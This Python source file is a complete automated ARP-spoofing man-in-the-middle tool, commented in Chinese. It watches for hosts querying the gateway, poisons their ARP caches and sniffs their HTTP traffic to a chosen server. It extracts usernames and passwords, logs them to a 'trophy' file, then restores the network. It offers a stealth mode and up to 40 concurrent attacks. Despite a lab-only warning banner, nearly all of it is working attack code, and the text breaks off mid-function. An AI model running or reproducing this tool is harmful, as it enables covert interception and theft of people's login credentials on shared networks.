#!/usr/bin/env python3
"""
ARP Spoofer · Ultimate Intelligence Edition (v13.0) - 一击脱离版 [智能截停]
================================================================
• 目标：被动监听ARP流量，在检测到对网关的ARP查询时，对该目标发起一次性的、
        高度隐蔽的中间人攻击，以截获其HTTP请求，随后立即恢复网络。
• 革命性升级：攻击机支持"一击脱离"，凭据捕获后立即停止嗅探！
• v13.0新特性：credentials_captured_flag信号旗、stop_filter智能截停
• v12.1修复：竞态条件修复，确保"先动手脚，再开监控"的正确执行顺序
• v12.0特性：战利品墙系统、源头拦截、任务中剪枝、极致资源优化
• 三线程架构：情报官(ARP监听) + Scout动态剪枝者(智能侦察) + 攻击机(一击脱离)
• 智能特性：线程安全缓存、自动过期清理、冷启动回退机制、香橙派3B极限优化
• 合法性：**仅限完全隔离的虚拟实验环境**；严禁在任何真实网络使用。
"""

import argparse
import os
import sys
import logging
import threading
import time
import signal
import re
import urllib.parse
from contextlib import contextmanager
from scapy.all import ARP, Ether, srp, sendp, sniff, conf, IP, UDP, Raw, TCP
import ipaddress

# --- 全局状态：ARP情报缓存与线程安全机制 ---
local_arp_cache = {}  # 格式: {ip_string: {'mac': mac_string, 'timestamp': time.time()}}
arp_cache_lock = threading.Lock()  # 保护共享缓存的线程锁
CACHE_TTL = 2400  # 缓存生存时间：40分钟 (优化版 - 提高命中率)

# 🚀 v10.1 终极性能版：并发攻击控制器 (香橙派3B 8G极限优化)
MAX_CONCURRENT_ATTACKS = 40   # 攻击线程数上限 - 极限性能配置 (每核10线程)
attack_semaphore = threading.Semaphore(MAX_CONCURRENT_ATTACKS)

# ★【新增】★ Scout线程控制器 (轻量级侦察线程 - 最大并发)
MAX_SCOUT_THREADS = 150       # Scout线程数上限 - 最大捕获覆盖范围
scout_semaphore = threading.Semaphore(MAX_SCOUT_THREADS)

# ★【优化】★ 精细化线程安全控制 - 分离锁以减少锁竞争
scouted_ips = set()  # 用于存储正在被侦察的IP地址，防止重复派遣Scout
attacked_ips = set()  # 用于存储正在被攻击的IP地址，防止重复攻击
scouted_ips_lock = threading.Lock()  # 专用于保护scouted_ips集合
attacked_ips_lock = threading.Lock()  # 专用于保护attacked_ips集合

# ★【v12.0 升级】★ 动态剪枝者：战利品墙系统
successful_attack_ips = set()  # 用于存储已成功捕获凭据的IP地址，实现动态剪枝
successful_attack_ips_lock = threading.Lock()  # 专用于保护successful_attack_ips集合

# --- 1. ARP情报收集系统 (Intelligence Gathering) ---

def update_arp_cache(pkt):
    """情报官的核心函数：从ARP包中提取并更新本地缓存"""
    if pkt.haslayer(ARP):
        try:
            src_ip = pkt[ARP].psrc
            src_mac = pkt[ARP].hwsrc
            
            # 过滤无效数据
            if not src_ip or not src_mac or src_ip == "0.0.0.0":
                return
                
            with arp_cache_lock:
                # 更新缓存，记录时间戳
                local_arp_cache[src_ip] = {
                    'mac': src_mac,
                    'timestamp': time.time()
                }
                
        except Exception as e:
            logging.debug(f"[情报官] 处理ARP包时异常: {e}")

def cleanup_stale_cache():
    """定期清理过期的缓存条目"""
    while True:
        try:
            current_time = time.time()
            with arp_cache_lock:
                expired_ips = [
                    ip for ip, info in local_arp_cache.items() 
                    if current_time - info['timestamp'] > CACHE_TTL
                ]
                for ip in expired_ips:
                    del local_arp_cache[ip]
                    
            if expired_ips:
                logging.debug(f"[情报官] 清理了 {len(expired_ips)} 个过期缓存条目")
                
        except Exception as e:
            logging.debug(f"[情报官] 缓存清理异常: {e}")
            
        time.sleep(300)  # 每5分钟清理一次

def start_intelligence_officer(iface):
    """启动情报官线程：被动监听ARP流量，建立本地情报库"""
    def intelligence_worker():
        logging.info("[*] [情报官] 开始被动收集网络情报...")
        try:
            sniff(filter="arp", prn=update_arp_cache, iface=iface, store=False)
        except Exception as e:
            logging.error(f"[!] [情报官] 线程异常: {e}")
    
    # 启动情报收集线程
    intel_thread = threading.Thread(target=intelligence_worker, name="Intelligence-Officer", daemon=True)
    intel_thread.start()
    
    # 启动缓存清理线程
    cleanup_thread = threading.Thread(target=cleanup_stale_cache, name="Cache-Cleaner", daemon=True)
    cleanup_thread.start()
    
    # 启动网络健康监测线程
    health_thread = threading.Thread(target=network_health_monitor, name="Health-Monitor", daemon=True)
    health_thread.start()
    
    logging.info("[+] 情报官系统已启动 (收集器+清理器+健康监测)")
    return intel_thread

def get_mac_from_cache(ip):
    """优先从缓存获取MAC地址，实现微秒级查询"""
    with arp_cache_lock:
        cache_entry = local_arp_cache.get(ip)
        if cache_entry and (time.time() - cache_entry['timestamp'] <= CACHE_TTL):
            return cache_entry['mac']
    return None

# --- 2. Utility & Pre-flight Check Functions ---

def validate_ip(ip_string):
    """验证IP地址格式是否有效。"""
    try:
        ipaddress.ip_address(ip_string)
        return True
    except ValueError:
        return False

def check_dependencies():
    """检查核心依赖库Scapy是否已安装。"""
    try:
        import scapy
    except ImportError:
        sys.exit("[-] 缺少 scapy 库，请安装: sudo pip3 install scapy")

def display_warning():
    """在脚本执行前显示重要的法律和道德警告。"""
    warning = """
    ☢️  终极风险警告 (FINAL WARNING) ☢️
    ============================================
    您即将运行的是一个 **事件驱动的自动化攻击工具**。
    它会持续监听网络，并在特定条件下自动对目标发起攻击。

    在非授权或非隔离环境下运行此脚本的后果是不可预知的。
    **这是我们技术探索的终点，也是责任的起点。**
    
    请最后一次确认，您在100%由您自己控制的虚拟环境中。
    按 Ctrl+C 在5秒内取消操作，否则脚本将继续...
    """
    print(warning)
    try:
        time.sleep(5)
    except KeyboardInterrupt:
        print("\n[!] 用户取消操作，脚本退出。")
        sys.exit(0)

def check_root():
    """确保脚本以root权限运行。"""
    if os.name == 'nt':  # Windows系统
        import ctypes
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                sys.exit("[-] 必须以管理员身份运行，请右键选择'以管理员身份运行'。")
        except:
            sys.exit("[-] 无法检测管理员权限，请以管理员身份运行。")
    else:  # Linux/Unix系统
        if os.geteuid() != 0:
            sys.exit("[-] 必须以 root 身份运行，请使用 sudo。")

def ensure_ip_forwarding():
    """自动开启IP转发，增强跨平台兼容性"""
    if os.name == 'nt':  # Windows系统
        logging.info("[*] Windows系统，尝试启用IP转发...")
        try:
            # 尝试启用IP路由
            result = os.system("netsh interface ipv4 set global forwarding=enabled > nul 2>&1")
            if result == 0:
                logging.info("[+] Windows IP转发已启用")
            else:
                logging.warning("[!] 无法自动启用IP转发，请手动在'路由和远程访问'中配置")
        except Exception as e:
            logging.warning(f"[!] IP转发配置异常: {e}")
        return
    
    # Linux/Unix系统
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "r+") as f:
            current_value = f.read().strip()
            if current_value != "1":
                logging.info("[*] 开启 Linux IP 转发...")
                f.seek(0)
                f.write("1\n")
                f.truncate()
                os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
                logging.info("[+] Linux IP转发已启用")
            else:
                logging.info("[+] Linux IP转发已启用")
    except IOError as e:
        logging.warning(f"[!] 无法读写IP转发配置: {e}")
    except Exception as e:
        logging.warning(f"[!] IP转发配置异常: {e}")

def get_mac(ip, iface):
    """增强版MAC获取：缓存优先，回退到实时查询"""
    # 第一步：尝试从缓存获取（微秒级）
    cached_mac = get_mac_from_cache(ip)
    if cached_mac:
        logging.debug(f"[情报官] 从缓存获取 {ip} -> {cached_mac}")
        return cached_mac, True # 返回MAC和缓存命中状态
    
    # 第二步：缓存未命中，回退到传统ARP查询（毫秒级）
    logging.debug(f"[情报官] 缓存未命中 {ip}，执行实时查询...")
    try:
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        answered = srp(pkt, timeout=1.5, retry=1, iface=iface, verbose=False)[0]  # 优化：加快查询
        if not answered:
            logging.warning(f"[-] 无法解析 {ip} 的 MAC。")
            return None, False
        
        mac = answered[0][1].hwsrc
        # 将查询结果添加到缓存
        with arp_cache_lock:
            local_arp_cache[ip] = {
                'mac': mac,
                'timestamp': time.time()
            }
        return mac, False
    except Exception as e:
        logging.error(f"[-] ARP探测失败 for {ip}: {e}")
        return None, False

def robust_get_mac(ip, iface, max_retries=3):
    """增强版MAC获取：带重试机制的鲁棒性查询"""
    # 首先尝试从缓存获取
    cached_mac = get_mac_from_cache(ip)
    if cached_mac:
        return cached_mac, True
    
    # 缓存未命中，执行带重试的ARP查询
    for attempt in range(max_retries):
        try:
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            answered = srp(pkt, timeout=2.5, retry=2, iface=iface, verbose=False)[0]  # 优化版
            
            if answered:
                mac = answered[0][1].hwsrc
                # 将查询结果添加到缓存
                with arp_cache_lock:
                    local_arp_cache[ip] = {
                        'mac': mac,
                        'timestamp': time.time()
                    }
                logging.debug(f"[情报官] ARP查询成功 {ip} -> {mac} (尝试 {attempt + 1})")
                return mac, False
            else:
                if attempt < max_retries - 1:
                    logging.debug(f"[情报官] ARP查询失败 {ip}，重试 {attempt + 2}/{max_retries}")
                    time.sleep(1)  # 等待1秒后重试
                
        except Exception as e:
            if attempt < max_retries - 1:
                logging.debug(f"[情报官] ARP查询异常 {ip}: {e}，重试 {attempt + 2}/{max_retries}")
                time.sleep(1)
            else:
                logging.error(f"[!] ARP查询彻底失败 {ip}: {e}")
    
    logging.warning(f"[-] 无法解析 {ip} 的 MAC 地址（重试 {max_retries} 次后失败）")
    return None, False

# --- 3. Core Spoofing & Restoration Functions ---

def spoof_once(victim_ip, victim_mac, pretend_ip, iface):
    """发送单次ARP欺骗回复。"""
    try:
        arp_reply = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=pretend_ip)
        sendp(Ether(dst=victim_mac) / arp_reply, iface=iface, verbose=False)
    except Exception as e:
        logging.error(f"[!] [攻击线程-{victim_ip}] ARP欺骗包发送失败: {e}")

def restore_arp(dst_ip, dst_mac, real_ip, real_mac, iface):
    """用正确的MAC地址恢复目标的ARP缓存。"""
    try:
        pkt = Ether(dst=dst_mac) / ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=real_ip, hwsrc=real_mac)
        sendp(pkt, count=3, iface=iface, verbose=False)
        garp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=real_ip, psrc=real_ip, hwsrc=real_mac)
        sendp(garp, count=2, iface=iface, verbose=False)
    except Exception as e:
        logging.error(f"[!] 恢复 {dst_ip} 的 ARP 失败: {e}")

@contextmanager
def attack_manager(victim_ip, victim_mac, gateway_ip, gateway_mac, iface, stealth_mode=False):
    """一个上下文管理器，负责攻击的执行与恢复。"""
    mode = 'Stealth (单向脉冲式)' if stealth_mode else 'Standard (持续双向)'
    logging.info(f"[*] [攻击线程-{victim_ip}] 开始对目标进行瞬时劫持 (模式: {mode})")
    stop_spoof_event = threading.Event()
    spoof_thread = None
    
    try:
        if stealth_mode:
            logging.info(f"[*] [攻击线程-{victim_ip}] (Stealth) 发送一次性单向欺骗包...")
            spoof_once(victim_ip, victim_mac, gateway_ip, iface)
        else:
            # ★【v12.1 修复】★ 步骤1: 先同步执行首次的双向欺骗，确保链路已被劫持
            logging.debug(f"[攻击线程-{victim_ip}] 执行首次双向欺骗...")
            spoof_once(victim_ip, victim_mac, gateway_ip, iface)
            spoof_once(gateway_ip, gateway_mac, victim_ip, iface)
            
            # ★【v12.1 修复】★ 步骤2: 后台线程只负责维持任务
            def spoof_loop():
                """维持循环，只负责后续的维持工作，不包含首次欺骗"""
                while not stop_spoof_event.is_set():
                    time.sleep(1.5)  # 维持频率
                    if not stop_spoof_event.is_set():  # 双重检查
                        spoof_once(victim_ip, victim_mac, gateway_ip, iface)
                        spoof_once(gateway_ip, gateway_mac, victim_ip, iface)
            
            spoof_thread = threading.Thread(target=spoof_loop, name=f"Spoofer-{victim_ip}", daemon=True)
            spoof_thread.start()

        # ★【v12.1 修复】★ 步骤3: 将控制权交还，此时链路已稳定
        yield
    
    finally:
        if spoof_thread:
            stop_spoof_event.set()
            spoof_thread.join(timeout=3.0)
        
        logging.info(f"[*] [攻击线程-{victim_ip}] 任务结束，正在恢复目标的网络...")
        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)
        if not stealth_mode:
            restore_arp(gateway_ip, gateway_mac, victim_ip, victim_mac, iface)
        logging.info(f"[+] [攻击线程-{victim_ip}] 目标网络已恢复。")


def extract_credentials(request_data, source_ip):
    """从HTTP请求中提取用户名和密码，并保存到temporary.txt文件"""
    try:
        user_account = None
        user_password = None
        
        # 定义可能的用户名和密码参数的正则表达式模式
        account_patterns = [
            r'user_account=([^&\s\r\n]+)',
            r'username=([^&\s\r\n]+)',
            r'account=([^&\s\r\n]+)',
            r'login=([^&\s\r\n]+)'
        ]
        
        password_patterns = [
            r'user_password=([^&\s\r\n]+)',
            r'password=([^&\s\r\n]+)',
            r'passwd=([^&\s\r\n]+)',
            r'pwd=([^&\s\r\n]+)'
        ]
        
        # 尝试从请求数据中提取用户名
        for pattern in account_patterns:
            match = re.search(pattern, request_data, re.IGNORECASE)
            if match:
                # 对找到的结果进行URL解码
                user_account = urllib.parse.unquote(match.group(1))
                break
        
        # 尝试从请求数据中提取密码
        for pattern in password_patterns:
            match = re.search(pattern, request_data, re.IGNORECASE)
            if match:
                # 对找到的结果进行URL解码
                user_password = urllib.parse.unquote(match.group(1))
                break
        
        # 如果用户名和密码都成功提取到，则保存到文件
        if user_account and user_password:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            # 格式化保存的内容：IP,用户名,密码,时间
            log_entry = f"{source_ip},{user_account},{user_password},{timestamp}\n"
            
            # 定义战利品文件名
            trophy_file = "temporary.txt"
            
            # 以追加模式(a)写入文件，确保多次运行不会覆盖
            with open(trophy_file, "a", encoding="utf-8") as f:
                f.write(log_entry)
            
            # 在屏幕上打印成功的日志
            logging.info(f"🔑 [凭据提取] 成功！已保存至 {trophy_file} : {source_ip} -> {user_account}:{user_password}")
            
            # ★【v12.0 升级】★ 将此IP登记到"战利品墙"，实现动态剪枝
            with successful_attack_ips_lock:
                successful_attack_ips.add(source_ip)
                logging.debug(f"[战利品墙] 目标 {source_ip} 已登记，后续将被动态剪枝")
            
            return True
        else:
            logging.debug(f"[凭据提取] 未在请求中发现完整的用户名和密码对。")
            return False
            
    except Exception as e:
        logging.warning(f"[!] [凭据提取] 处理时发生异常: {e}")
        return False

def launch_attack_on(target_ip, gateway_info, server_ip, port, iface, timeout, stealth_mode, stats):
    """由攻击线程执行的函数，对单个目标完成一次完整的"瞬时劫持"。"""
    attack_semaphore.acquire()  # 🚀 新增：领取通行证
    try:
        # ★【v13.0 升级】★ 定义一个攻击任务是否成功的信号旗
        credentials_captured_flag = False
        
        logging.info(f"\n[!] [攻击线程-{target_ip}] 已激活！正在获取目标MAC...")
        stats['attacks_launched'] += 1
        
        # 🚀 关键优化：使用缓存优先的MAC查询
        start_time = time.time()
        target_mac, from_cache = robust_get_mac(target_ip, iface)
        query_time = (time.time() - start_time) * 1000
        
        if from_cache:
            stats['cache_hits'] += 1
        else:
            stats['cache_misses'] += 1

        if not target_mac:
            logging.error(f"[-] [攻击线程-{target_ip}] 获取MAC失败，攻击中止。")
            return
            
        logging.info(f"[+] [攻击线程-{target_ip}] MAC解析完成 ({query_time:.2f}ms): {target_mac}")

        # 🚀 v11.1 优化：使用"宽进严出"BPF过滤器策略
        # 先捕获所有来自目标的TCP流量，再在Python中精确筛选
        bpf_filter = f"tcp and src host {target_ip} and dst host {server_ip}"
        logging.debug(f"[攻击线程-{target_ip}] 宽泛过滤器: {bpf_filter}")
        
        def http_packet_handler(pkt):
            # ★【v13.0 升级】★ 声明需要修改外部作用域的信号旗
            nonlocal credentials_captured_flag
            
            # 🚀 v11.1 二次筛选：在Python中进行精确的端口和协议检查
            if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
                return False
                
            # 检查目标端口是否匹配（支持多端口检查）
            common_web_ports = [port, 80, 443, 8080, 8443, 8000]  # 扩展端口覆盖
            if pkt[TCP].dport not in common_web_ports:
                return False
            
            if pkt.haslayer(Raw):  # 使用更健壮的Layer检查
                try:
                    payload = bytes(pkt[Raw].load)  # 明确使用Raw类
                    http_methods = [b"GET ", b"POST ", b"PUT ", b"DELETE ", b"HEAD ", b"OPTIONS ", b"PATCH "]
                    for method in http_methods:
                        if payload.startswith(method):
                            detected_port = pkt[TCP].dport
                            port_type = "HTTPS" if detected_port == 443 else "HTTP" if detected_port == 80 else f"端口{detected_port}"
                            logging.info(f"\n\n🎯 [HTTP拦截] 从 {target_ip} 捕获到 {method.decode().strip()} 请求！({port_type})")
                            stats['http_requests_captured'] += 1
                            try:
                                # 将捕获到的原始数据转换为字符串
                                full_request = payload.decode(errors="ignore")
                                
                                # 分离请求头和可能的请求体
                                if "\r\n\r\n" in full_request:
                                    headers_part, body_part = full_request.split("\r\n\r\n", 1)
                                else:
                                    headers_part = full_request
                                    body_part = ""
                                
                                # 打印完整、无脱敏的捕获内容
                                logging.info("=" * 80)
                                logging.info("📋 完整HTTP请求内容 (无脱敏):")
                                logging.info("=" * 80)
                                logging.info("🔸 HTTP请求头:")
                                logging.info("-" * 40)
                                logging.info(headers_part)
                                
                                if body_part:
                                    logging.info("\n🔸 HTTP请求体:")
                                    logging.info("-" * 40)
                                    logging.info(body_part)
                                
                                logging.info("=" * 80)
                                logging.info(f"✅ HTTP请求已完整记录 (来源: {target_ip})")
                                
                                # ★【v13.0 升级】★ 不仅提取凭据，还要根据结果设置信号旗
                                if extract_credentials(full_request, target_ip):
                                    credentials_captured_flag = True
                                    logging.info(f"🏆 [一击脱离] 目标 {target_ip} 凭据捕获成功！触发立即撤离机制！")
                                
                                logging.info("=" * 80 + "\n")
                                
                            except Exception as e:
                                logging.warning(f"[!] 解析并打印HTTP请求失败: {e}")
                            
                            # 【修改】移除return True，让嗅探持续进行，完整捕获窗口期内的所有请求
                            break  # 跳出method循环，避免重复处理同一个包
                except Exception as e:
                    logging.debug(f"[!] 包处理异常: {e}")
            return False  # 确保函数返回False，让sniff继续

        with attack_manager(target_ip, target_mac, gateway_info['ip'], gateway_info['mac'], iface, stealth_mode):
            logging.info(f"[*] [攻击线程-{target_ip}] 已锁定目标，在 {timeout} 秒攻击窗口内进行完整流量捕获...")
            sniff(
                filter=bpf_filter, 
                iface=iface, 
                prn=http_packet_handler, 
                store=False, 
                timeout=timeout,
                # ★【v13.0 核心升级】★ 安装停止过滤器，实现"一击脱离"
                stop_filter=lambda pkt: credentials_captured_flag
            )
            
            # ★【v13.0 优化】★ 增加明确的攻击结束原因日志
            if credentials_captured_flag:
                logging.info(f"[*] [攻击线程-{target_ip}] 🏆 凭据捕获成功！提前结束攻击，立即进入网络恢复阶段。")
            else:
                logging.info(f"[*] [攻击线程-{target_ip}] ⏰ 攻击窗口超时，未捕获到凭据，正常结束。")
    finally:
        # ★【修复】★ 攻击线程结束时，自己负责清理attacked_ips状态
        with attacked_ips_lock:
            attacked_ips.discard(target_ip)
            logging.debug(f"[攻击线程-{target_ip}] 攻击任务已完成，清理状态")
        attack_semaphore.release()  # 🚀 新增：归还通行证

# --- 4. Main Logic & Setup ---

def parse_args():
    """解析并验证命令行参数。"""
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter, description="ARP Spoofer · Ultimate Intelligence Edition (v13.0) - 一击脱离版 [智能截停]")
    parser.add_argument("-g", "--gateway", required=True, help="网关的 IP 地址。")
    parser.add_argument("-s", "--server", required=True, help="欲截获的目标服务器 IP 地址。")
    parser.add_argument("-p", "--port", type=int, default=80, help="要监听的目标服务器端口 (默认: 80)。")
    parser.add_argument("-i", "--iface", help="指定使用的网卡 (默认将由Scapy自动选择)。")
    parser.add_argument("--log", default="hunter_ultimate.log", help="保存捕获数据和运行状态的日志文件。")
    parser.add_argument("--stealth", action="store_true", help="启用潜行模式 (单向、单次脉冲式欺骗，更隐蔽)。")
    parser.add_argument("--timeout", type=int, help="每次攻击的最长等待时间（秒）。\n(默认: Standard=45s, Stealth=20s)")
    parser.add_argument("--auth-server", help="认证服务器IP (如121.248.150.37)，启用精确制导模式")
    parser.add_argument("--auth-port", type=int, default=801, help="认证服务器端口 (默认: 801)")
    parser.add_argument("--preload", type=int, default=30, help="情报官预热时间（秒），建议30-60秒。")
    
    args = parser.parse_args()
    
    for ip_arg, ip_value in [("gateway", args.gateway), ("server", args.server)]:
        if not validate_ip(ip_value):
            sys.exit(f"[-] 无效的 {ip_arg} IP地址: {ip_value}")
    if args.timeout is not None and args.timeout <= 0:
        sys.exit("[-] 超时时间必须是正整数。")
    if args.preload < 0:
        sys.exit("[-] 预热时间不能为负数。")
        
    return args

def setup_signal_handlers():
    """设置信号处理器以优雅退出。"""
    def signal_handler(signum, frame):
        logging.info(f"\n[!] 收到信号 {signal.Signals(signum).name}，正在优雅退出...")
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

def show_cache_status():
    """显示当前缓存状态，包含详细设备信息"""
    with arp_cache_lock:
        cache_size = len(local_arp_cache)
        if cache_size > 0:
            # 显示最新的5个缓存条目
            recent_entries = sorted(
                local_arp_cache.items(),
                key=lambda x: x[1]['timestamp'],
                reverse=True
            )[:5]
            
            logging.info(f"[情报官] 当前缓存: {cache_size} 个设备")
            for ip, info in recent_entries:
                age = time.time() - info['timestamp']
                logging.info(f"  - {ip} -> {info['mac']} (录入于 {age:.1f}s 前)")
                
            if cache_size > 5:
                logging.info(f"  ... 还有 {cache_size - 5} 个设备未显示")
        else:
            logging.info("[情报官] 缓存为空，等待网络活动...")
        return cache_size

def intelligent_preload(iface, preload_time, min_devices=3):
    """智能预热机制：动态评估网络活跃度，优化预热效果"""
    logging.info(f"[情报官] 启动智能预热模式，目标时间: {preload_time}秒")
    
    start_time = time.time()
    last_cache_size = 0
    stable_count = 0
    
    while time.time() - start_time < preload_time:
        time.sleep(2)  # 每2秒检查一次
        current_cache_size = show_cache_status()
        
        # 检查缓存增长是否稳定
        if current_cache_size == last_cache_size:
            stable_count += 1
        else:
            stable_count = 0
            last_cache_size = current_cache_size
        
        # 智能提前结束条件
        if current_cache_size >= min_devices and stable_count >= 3:
            elapsed = time.time() - start_time
            logging.info(f"[情报官] 网络活跃度已稳定，预热提前完成 (用时 {elapsed:.1f}s)")
            break
    
    final_cache_size = show_cache_status()
    if final_cache_size == 0:
        logging.warning("[情报官] 预热期间未收集到任何设备信息，将依赖实时查询")
    else:
        logging.info(f"[情报官] 预热完成，已收集 {final_cache_size} 个设备的网络情报")
    
    return final_cache_size

def network_health_monitor():
    """网络健康监测：监控ARP流量活跃度，评估预热效果"""
    last_cache_size = 0
    consecutive_stable = 0
    
    while True:
        try:
            with arp_cache_lock:
                current_size = len(local_arp_cache)
            
            if current_size == last_cache_size:
                consecutive_stable += 1
            else:
                consecutive_stable = 0
                last_cache_size = current_size
            
            # 如果缓存长时间没有增长，说明网络可能不活跃
            if consecutive_stable >= 10:  # 10次检查无变化（50分钟）
                logging.info(f"[健康监测] 网络活跃度较低，缓存稳定在 {current_size} 个设备")
                consecutive_stable = 0  # 重置计数
            
            time.sleep(300)  # 每5分钟检查一次
            
        except Exception as e:
            logging.debug(f"[健康监测] 监测异常: {e}")
            time.sleep(300)

def get_cache_analytics():
    """获取缓存分析数据，用于性能评估"""
    with arp_cache_lock:
        if not local_arp_cache:
            return {'total': 0, 'fresh': 0, 'aging': 0, 'stale': 0, 'avg_age': 0}
        
        current_time = time.time()
        ages = [(current_time - info['timestamp']) for info in local_arp_cache.values()]
        
        fresh_count = sum(1 for age in ages if age < 300)    # 5分钟内的新鲜缓存
        aging_count = sum(1 for age in ages if 300 <= age < 900)  # 5-15分钟的老化缓存
        stale_count = sum(1 for age in ages if age >= 900)   # 超过15分钟的陈旧缓存
        
        return {
            'total': len(local_arp_cache),
            'fresh': fresh_count,
            'aging': aging_count, 
            'stale': stale_count,
            'avg_age': sum(ages) / len(ages) if ages else 0
        }

def main():
    # 1. 初始设置
    display_warning()
    check_root()
    check_dependencies()
    
    args = parse_args()
    
    if args.timeout is None:
        args.timeout = 20 if args.stealth else 45

    logging.basicConfig(level=logging.INFO,
                        format="[%(asctime)s] [%(threadName)-18s] %(message)s",
                        datefmt="%Y-%m-%d %H:%M:%S",
                        handlers=[logging.FileHandler(args.log, mode='w'), logging.StreamHandler()])

    setup_signal_handlers()
    ensure_ip_forwarding()

    # 2. 环境准备
    iface = args.iface or conf.iface
    logging.info(f"[*] 使用网卡: {iface}")
    if args.stealth:
        logging.info("[*] 潜行模式已启用：将使用单向、单次脉冲式欺骗，攻击窗口更短。")
    
    # 🚀 3. 启动情报官线程 - 核心优化！
    logging.info(f"\n[*] 启动情报官线程，开始ARP缓存预热...")
    start_intelligence_officer(iface)
    
    # 使用智能预热机制
    if args.preload > 0:
        intelligent_preload(iface, args.preload, min_devices=3)
    else:
        logging.info("[*] 跳过预热期，直接启动")
        show_cache_status()
    
    # 注意：Health-Monitor已在start_intelligence_officer()中启动，无需重复
    
    # 4. 初始化主循环状态
    logging.info("[+] 系统已准备就绪，开始监听攻击触发器...")
    stats = {'arp_queries_detected': 0, 'attacks_launched': 0, 'http_requests_captured': 0, 'cache_hits': 0, 'cache_misses': 0, 'start_time': time.time()}
    
    # ★【注意】★ attacked_ips和scouted_ips现在是全局变量，不需要在这里重新初始化
    
    # 预热后获取网关MAC，确保缓存优先
    logging.info("[*] 获取网关MAC地址...")
    gateway_mac_result = robust_get_mac(args.gateway, iface)
    if gateway_mac_result[0] is None:
        sys.exit(f"[-] 致命错误: 无法获取网关 {args.gateway} 的 MAC 地址")
    
    gateway_info = {'ip': args.gateway, 'mac': gateway_mac_result[0]}
    cache_hit_indicator = "缓存命中" if gateway_mac_result[1] else "实时查询"
    logging.info(f"[+] 网关: {gateway_info['ip']} -> {gateway_info['mac']} ({cache_hit_indicator})")

    def arp_watcher_handler(pkt):
        """★【升级版】★ 智能混合攻击的ARP雷达回调函数"""
        # 检查这是否是一个ARP "who-has" (op=1) 请求
        if pkt.haslayer(ARP) and pkt[ARP].op == 1:
            try:
                # 检查被请求的IP是否是网关的IP
                if pkt[ARP].pdst == args.gateway:
                    stats['arp_queries_detected'] += 1
                    target_ip = pkt[ARP].psrc
                    
                    # ★【v12.0 升级】★ 源头拦截检查 (第一道防线) - 动态剪枝
                    with successful_attack_ips_lock:
                        if target_ip in successful_attack_ips:
                            # 对于已捕获的目标，静默忽略，不进行任何操作，不打印任何信息
                            # 这实现了微秒级的资源节约，避免无效的Scout派遣
                            return  # 直接返回，不消耗任何后续资源
                    
                    # ★ 核心逻辑：判断是否需要派遣Scout ★
                    # 如果目标IP是网关，则忽略
                    if target_ip == gateway_info['ip']:
                        return
                    
                    # ★【优化】★ 使用专用锁检查目标状态，避免重复工作
                    should_scout = False
                    with attacked_ips_lock:
                        if target_ip not in attacked_ips:
                            with scouted_ips_lock:
                                if target_ip not in scouted_ips:
                                    # ★ 派遣Scout！★
                                    # 将目标加入侦察列表
                                    scouted_ips.add(target_ip)
                                    should_scout = True
                    
                    if should_scout:
                        logging.info(f"\n[!] ARP-TRIGGER: 检测到 {target_ip} 正在寻找网关！")
                        logging.info(f"[Radar] 派遣侦察兵调查 {target_ip}...")
                        
                        # ★【修复版】★ 只派遣Scout，不再直接启动攻击
                        # Scout将负责侦察→决策→攻击的完整流程
                        scout_thread = threading.Thread(
                            target=scout,
                            args=(target_ip, args.server, args.port, iface, args.timeout, args.stealth, gateway_info, stats, args.auth_server, args.auth_port),
                            name=f"Scout-{target_ip}",
                            daemon=True
                        )
                        scout_thread.start()
                    
            except Exception as e:
                logging.debug(f"ARP包处理异常: {e}")

    # 5. 启动主循环 - ★【智能混合攻击引擎】★
    logging.info(f"[*] 🎯 智能混合攻击引擎已启动！")
    logging.info(f"[*] 全域雷达开启，监听对网关 '{args.gateway}' 的ARP查询...")
    logging.info(f"[*] Scout系统就绪，最大并发侦察: {MAX_SCOUT_THREADS} 个")
    logging.info(f"[*] Attack系统就绪，最大并发攻击: {MAX_CONCURRENT_ATTACKS} 个")
    try:
        sniff(filter="arp", prn=arp_watcher_handler, iface=iface, store=False)
    except KeyboardInterrupt:
        pass
    except Exception as e:
        logging.error(f"\n[-] 主嗅探器发生致命错误: {e}")
    finally:
        # 6. 最终统计与退出
        runtime = time.time() - stats['start_time']
        cache_hit_rate = stats['cache_hits'] / stats['attacks_launched'] * 100 if stats['attacks_launched'] > 0 else 0
        
        logging.info("\n" + "=" * 70)
        logging.info(" 🎯 智能混合攻击引擎运行报告 (Ultimate Intelligence Edition v13.0-一击脱离版[智能截停]) 🎯")
        logging.info("=" * 70)
        logging.info(f"  📊 基础统计:")
        logging.info(f"    - 运行时间: {runtime:.2f} 秒")
        logging.info(f"    - 检测到ARP查询: {stats['arp_queries_detected']}")
        logging.info(f"    - 启动攻击次数: {stats['attacks_launched']}")
        logging.info(f"    - 捕获HTTP请求: {stats['http_requests_captured']}")
        
        # ★【v12.0 升级】★ 显示动态剪枝效果
        with successful_attack_ips_lock:
            successful_count = len(successful_attack_ips)
        logging.info(f"    - 成功捕获凭据: {successful_count} 个目标")
        
        logging.info(f"  ⚡ 性能指标:")
        logging.info(f"    - 攻击反应缓存命中率: {cache_hit_rate:.1f}% ({stats['cache_hits']}/{stats['attacks_launched']})")
        
        if successful_count > 0:
            success_rate = successful_count / stats['attacks_launched'] * 100 if stats['attacks_launched'] > 0 else 0
            logging.info(f"    - 攻击成功率: {success_rate:.1f}% ({successful_count}/{stats['attacks_launched']})")
            logging.info(f"    - 动态剪枝生效: {successful_count} 个目标将被智能跳过")
        
        # 显示性能优化效果
        if stats['cache_hits'] > 0:
            estimated_time_saved = stats['cache_hits'] * 0.02  # 假设每次缓存命中节省20ms
